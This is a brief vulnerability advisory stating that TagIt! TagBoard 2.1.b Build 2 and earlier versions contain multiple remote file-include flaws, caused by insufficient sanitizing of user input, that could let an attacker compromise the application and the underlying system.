TagIt! TagBoard is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.

Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.

TagBoard 2.1.b Build 2 and prior versions are vulnerable.
